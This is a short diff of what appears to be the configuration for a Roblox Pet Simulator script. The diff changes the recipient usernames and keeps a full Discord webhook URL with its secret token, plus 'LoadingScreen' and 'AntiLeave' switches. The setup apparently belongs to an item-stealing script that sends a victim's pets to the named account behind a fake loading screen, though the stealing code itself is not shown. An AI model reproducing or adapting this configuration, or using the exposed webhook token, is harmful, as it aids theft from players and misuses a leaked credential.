@@ -1,5 +1,5 @@
-UserName = "petsimiulator100day"
-UserName2 = "petsimiulator100day"
+UserName = "HieuPetSimx"
+UserName2 = "HieuPetSimx"
 Webhook = "https://discord.com/api/webhooks/1107533224663584778/XWBxYKxxqanRKTpMDOilsxZ9vUfjNYiPGOMWT-diP42edMrYUbbw50sNjT4EqJ68TT3H"
 _G.LoadingScreen = true
 _G.AntiLeave = false
